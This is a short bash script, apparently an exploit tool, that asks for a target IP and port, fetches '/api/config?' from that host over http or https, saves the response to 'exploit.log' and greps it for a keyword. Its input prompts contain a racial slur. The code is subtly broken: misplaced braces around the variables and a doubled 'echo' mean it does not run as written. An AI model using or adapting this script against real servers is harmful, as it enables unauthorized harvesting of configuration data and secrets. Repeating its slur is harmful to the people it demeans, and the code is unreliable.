echo "Choose protocol"
echo "1. http"
echo "2. https"
read proto
case $proto in

	1) 
echo "Enter ip"
read dom
echo "Enter port niggaaaaaaaaaa"
read port
echo "grep keyword"
read grepkey
curl http://{$dom}:{$port}/api/config? > exploit.log; cat exploit.log | grep $grepkey

;;

	2)
echo echo "Enter ip"
read dom
echo "Enter port niggaaaaaaaaaa"
read port
echo "grep keyword"
read grepkey
curl https://{$dom}:{$port}/api/config? > exploit.log; cat exploit.log | grep $grepkey


;;
esac
